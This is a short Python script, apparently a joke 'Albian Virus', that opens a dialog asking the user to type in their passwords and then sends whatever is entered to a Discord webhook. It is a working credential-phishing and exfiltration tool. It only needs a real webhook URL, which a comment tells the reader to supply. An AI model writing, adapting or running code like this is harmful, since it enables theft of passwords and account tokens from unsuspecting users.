import tkinter as tk
from tkinter import simpledialog
import requests

def get_discord_token():
    root = tk.Tk()
    root.withdraw()

    discord_token = simpledialog.askstring(
        "Albian Virus",  # Window name & Confiugre messages
        "Hi there, due to the poor budget of our virus you need to manually enter your passwords:"
    )

    if discord_token:
        send_to_discord(discord_token)

def send_to_discord(token):
    webhook_url = 'https://discord.com/api/webhooks/your_webhook_here'  # <--Put your real discord webhook here

    data = {
        'content': f'Logged: {token}'
    }

    try:
        response = requests.post(webhook_url, json=data)

        if response.status_code == 204:
            print('Token successfully sent to Discord!')
        else:
            print(f'Failed to send token to Discord. Status code: {response.status_code}')
    except Exception as e:
        print(f'An error occurred: {e}')

get_discord_token()
